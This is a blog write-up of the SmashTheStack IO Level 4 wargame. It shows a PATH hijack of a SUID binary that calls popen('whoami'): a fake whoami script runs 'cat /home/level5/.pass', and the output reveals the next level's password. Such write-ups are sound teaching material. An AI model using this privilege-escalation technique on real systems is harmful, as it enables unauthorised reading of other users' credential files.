---
layout: post
title: "SmashTheStack IO Level 4"
date: 2014-07-07 22:24:52 +0300
comments: true
categories: [writeups, wargames]
keywords: smash the stack, wargames, smashthestack io, smashthestack io level 4, smashthestack
description: SmashTheStack IO Level 4
---

We have source code for this level as well in level04.c:
<!-- more -->

``` c
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

#### Function overview

**popen**

_FILE *popen(const char *command, const char *type);_

Opens a process by creating a pipe,  forking,  and invoking  the shell.  Since a pipe is by definition unidirectional, the type argument may specify  only  reading  or  writing,  not  both;  the resulting stream is correspondingly read-only or write-only.

The  command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh using  the -c  flag;  interpretation, if any, is performed by the shell.  The type argument is a pointer to a null-terminated string  which  must  contain either the letter 'r' for reading or the letter 'w' for writing.  Since glibc 2.9, this argument can additionally include the letter 'e', which causes  the close-on-exec flag (FD_CLOEXEC) to be set on the underlying file descriptor.

The  return  value  from popen() is a normal standard I/O stream in all respects save  that  it  must  be  closed  with  pclose()  rather  than *fclose(3)*.   Writing  to  such a stream writes to the standard input of the command; the command's standard output is the same as that  of  the process  that  called  popen(),  unless  this is altered by the command itself.  Conversely, reading from a "popened"  stream  reads  the  command's standard output, and the command's standard input is the same as that of the process that called popen().

Note that output popen() streams are fully buffered by default.

The popen() function returns NULL if the *fork(2)* or *pipe(2)* calls fail, or if it cannot allocate memory.

The popen() function does not set errno if memory allocation fails.  If the underlying fork(2) or pipe(2) fails, errno  is  set  appropriately. If  the type argument is invalid, and this condition is detected, errno is set to EINVAL.

Since the standard input of a command opened  for  reading  shares  its seek  offset  with  the  process  that  called popen(), if the original process has done a buffered read, the command's input position may  not be  as expected.  Similarly, the output from a command opened for writing may become intermingled with that of  the  original  process.   The latter can be avoided by calling fflush(3) before popen().

Failure  to  execute  the  shell  is indistinguishable from the shell's failure to execute command, or an immediate exit of the  command.   The only hint is an exit status of 127.


**fgets**

_char *fgets(char *str, int num, FILE *stream);_

The *fgets()* function reads up to *num–1* characters from *stream* and stores them in the character array pointed to by *str*. Characters are read until either a newline or an EOF is received or until the specified limit is reached. After the characters have been read, a null is stored in the array immediately after the last character read. A newline character will be retained and will be part of the array pointed to by *str*.


On success, the function returns *str*.
If the end-of-file is encountered while attempting to read a character, the eof indicator is set (*feof*). If this happens before any characters could be read, the pointer returned is a null pointer (and the contents of *str* remain unchanged).
If a read error occurs, the error indicator (*ferror*) is set and a null pointer is also returned (but the contents pointed by *str* may have changed).


#### Program description

This program executes a shell command and prints the results. If we try to run it, we see this:

``` plain
level4@io:/levels$ ./level04
Welcome level5
```

This makes sense, since it's a SUID binary owned by the level5 user. What we want to do is substitue the command called by popen with one that will help us advance, like <code>cat /home/level5/.pass</code>

We can't directly influence the program since it doesn't take user input. But we know that the change must occur in the popen line. So in that line, it opens a pipe for reading to the *whoami* command. We can't put another command its place, but maybe we don't have to. How does the program know where to find whoami? Let's first find it ourselves:

``` plain
level4@io:/levels$ which whoami
/usr/bin/whoami
```

For this we have to understand the concept of PATH:

> PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for 
> executable files in response to commands issued by a user. 
> Each user on a system can have a different PATH variable. 

> (The Linux Information Project)

To see the contents of our PATH variable, we do this:

``` plain
level4@io:/levels$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

So this is how the program knew how to find whoami. It just searched those directories until it found it. And we know we can add a new directory to our default search path with one of the below commands:

``` plain
PATH="directory:$PATH"

PATH=$PATH:directory
export PATH

export PATH=$PATH:directory
```

Now we should get an idea of the steps to exploit the program. We can create our own directory and store in it a program named whoami that would do what we want it to. Then should add that directory to our path, and then level04 program searches for whoami, it will hit upon our own whoami version instead. Let's do that now.

``` plain
level4@io:/levels$ mkdir /tmp/mydir
level4@io:/tmp/mydir$ echo "cat /home/level5/.pass" > /tmp/mydir/whoami
level4@io:/tmp/mydir$ ls -l whoami
-rw-r--r-- 1 level4 level4 23 Jul 17 17:44 whoami
```

If we leave it like this, the permissions won't allow it to be executed, so I make it readable, writable and executable for everyone with the following:

``` plain
chmod 777 whoami
level4@io:/tmp/mydir$ ls -l whoami
-rwxrwxrwx 1 level4 level4 23 Jul 17 17:44 whoami
```

Now add our directory to our PATH:

``` plain
level4@io:/tmp/mydir$ PATH="/tmp/mydir:$PATH"
level4@io:/tmp/mydir$ echo $PATH
/tmp/mydir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

All that's left is to run the level04 binary and collect the password:

``` plain
level4@io:/tmp/mydir$ /levels/level04
Welcome KGpWsju2vDpmxcxlvm
```

> Work consists of whatever a body is obliged to do.
> Play consists of whatever a body is not obliged to do.

> -- Mark Twain




